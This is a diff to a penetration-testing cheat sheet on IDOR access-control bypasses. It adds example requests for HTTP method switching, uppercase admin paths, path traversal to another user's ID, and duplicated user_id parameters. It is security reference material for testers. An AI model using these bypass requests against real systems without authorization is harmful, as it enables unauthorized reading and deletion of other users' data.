@@ -1,5 +1,12 @@
 # Insecure Direct Object Reference (IDOR)
 
+### Change HTTP method
+
+```bash
+GET /users/delete/123 -> 403
+POST /users/delete/123 -> 200
+```
+
 ### Change file extension
 
 Try to change the extension of the endpoint that you have.
@@ -49,6 +56,30 @@ Many API endpoints expose the version in the request, try to change it to use an
 #Changed version of the same endpoint
 /api/v2/user/user3
 /api/v1/user/user3
+```
+
+### Missing Function Level Access Control (MFLAC)
+
+```bash
+GET /admin/profile -> 401
+GET /ADMIN/profile -> 200
+```
+
+### Path Traversal Secondary Context
+
+```bash
+#Original request
+POST /users/delete/123 -> 403
+
+#Bypass
+POST /users/delete/MY_ID/../123 -> 200
+```
+
+### HTTP Parameter Pollution
+
+```
+GET /api/v1/messages?user_id=ATACKER_ID&user_id=VICTIM_ID
+GET /api/v1/messages?user_id=VICTIM_ID&user_id=ATACKER_ID
 ```
 
 ### References
